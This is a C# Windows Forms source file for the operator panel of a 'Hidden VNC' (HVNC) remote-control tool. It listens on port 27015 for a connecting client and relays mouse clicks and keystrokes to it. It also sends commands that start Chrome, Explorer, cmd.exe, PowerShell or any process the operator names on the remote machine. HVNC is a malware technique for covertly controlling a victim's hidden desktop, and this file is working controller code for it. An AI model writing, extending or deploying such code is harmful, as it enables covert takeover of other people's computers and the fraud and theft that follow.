using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Hidden_VNC_Server
{
    public partial class HVNC : Form
    {
        public HVNC()
        {
            InitializeComponent();
            img.MouseDown += PictureBox1_MouseDown;
            img.MouseUp += PictureBox1_MouseUp;
            this.KeyDown += HVNC_KeyDown;
            this.KeyUp += HVNC_KeyUp;

            // Start menu events
            runChrome.Click += new EventHandler((object s, EventArgs e) => SendCommand("2|cmd.exe /c start chrome.exe"));
            runExplorer.Click += new EventHandler((object s, EventArgs e) => SendCommand("2|cmd.exe /c C:\\Windows\\explorer.exe"));
            runCmd.Click += new EventHandler((object s, EventArgs e) => SendCommand("2|cmd.exe"));
            runPowershell.Click += new EventHandler((object s, EventArgs e) => SendCommand("2|powershell.exe"));

            // Trackbars events
            imageQualityTrack.Scroll += new EventHandler((object s, EventArgs e) => imageQuality.Value = imageQualityTrack.Value);
            jpegCompressionTrack.Scroll += new EventHandler((object s, EventArgs e) => jpegCompression.Value = jpegCompressionTrack.Value);
            inputCooldownTrack.Scroll += new EventHandler((object s, EventArgs e) => inputCooldown.Value = inputCooldownTrack.Value);
            processCooldownTrack.Scroll += new EventHandler((object s, EventArgs e) => processCooldown.Value = processCooldownTrack.Value);

            // Settings
            settingsClickTooltip.Click += new EventHandler((object s, EventArgs e) => settings.Show());
            settingsHideClickTooltip.Click += new EventHandler((object s, EventArgs e) => settings.Hide());
        }

        bool running;
        TcpListener listener;
        TcpClient client;
        private void Form1_Load(object sender, EventArgs e)
        {
            listener = new TcpListener(IPAddress.Any, 27015);
        }

        private void AcceptClient(IAsyncResult result)
        {
            client = listener.EndAcceptTcpClient(result);
            status.Invoke(new Action(() => {
                startClick.Enabled = true;
                explorerClick.Enabled = true;
                statusText.Text = "Connected";
            }));
            HandleConnection();
        }

        private void HandleConnection()
        {
            NetworkStream stream = client.GetStream();
            Networking networking = new Networking(client, img);
            Task.Run(() => networking.Initialize());
        }

        private void SendCommand(string command)
        {
            client.Client.Send(Encoding.UTF8.GetBytes(command));
        }
        private void Click(int isLeft, int isUp, int x, int y)
        {
            int height = img.Height;
            int width = img.Width;
            
            double relativeX = (double)x / width;
            double relativeY = (double)y / height;

            int remoteDesktopX = (int)(relativeX * Networking.ScreenDimensions.width);
            int remoteDesktopY = (int)(relativeY * Networking.ScreenDimensions.height);
            SendCommand($"0|{isLeft}|{isUp}|{remoteDesktopX}|{remoteDesktopY}");
        }

        private void Key(int isUp, int key)
        {
            SendCommand($"1|{isUp}|{key}");
        }

        
        private void startListeningToolStripMenuItem_Click(object sender, EventArgs e)
        {
            running = true;
            statusText.Text = "Status: Listening";
            listener.Start();
            listener.BeginAcceptTcpClient(new AsyncCallback(result => AcceptClient(result)), null);
        }
        private void stopListeningToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!running) return;
            running = false;
            startClick.Enabled = false;
            explorerClick.Enabled = false;
            if (client.Connected)
                client.Client.Disconnect(false);
            listener.Stop();
            statusText.Text = "Status: Offline";
        }
        private void customToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!running) return;
            string s = (string)Interaction.InputBox("You can also use arguments.", "Enter process name");
            if (s != "") SendCommand($"2|{s}");
        }
        private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            if (!running) return;
            Click(e.Button == MouseButtons.Left ? 1 : 0, 1, e.X, e.Y);
        }
        private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (!running) return;
            Click(e.Button == MouseButtons.Left ? 1 : 0, 0, e.X, e.Y);
        }
        private void HVNC_KeyUp(object sender, KeyEventArgs e)
        {
            if (!running) return;
            Key(1, e.KeyValue);
        }
        private void HVNC_KeyDown(object sender, KeyEventArgs e)
        {
            if (!running) return;
            Key(0, e.KeyValue);
        }

        private void toolStripSplitButton2_ButtonClick(object sender, EventArgs e)
        {
            if (!running) return;
            SendCommand("3");
        }

        private void settingsClick_ButtonClick(object sender, EventArgs e)
        {
            settings.Visible = !settings.Visible;
        }

        private void saveChanges_Click(object sender, EventArgs e)
        {
            if (client == null || !client.Connected)
            {
                MessageBox.Show("HVNC Client is not connected, unable to modify settings.", "Help", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            SendCommand($"4|{imageQuality.Value}|{jpegCompression.Value}|{inputCooldown.Value}|{processCooldown.Value}|{(enableDebug.Checked?1:0)}|{difference.Value}");
            settings.Hide();
        }

        private void resetChanges_Click(object sender, EventArgs e)
        {
            imageQuality.Value = 70;
            imageQualityTrack.Value = 70;

            jpegCompression.Value = 50;
            jpegCompressionTrack.Value = 50;

            inputCooldown.Value = 1;
            inputCooldownTrack.Value = 1;
            processCooldown.Value = 1;
            processCooldownTrack.Value = 1;

            difference.Value = (decimal)0.0001;
            MessageBox.Show("Settings have been succesfully reset.\nPlease do not forget to use save button.",
                                                            "Help", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}
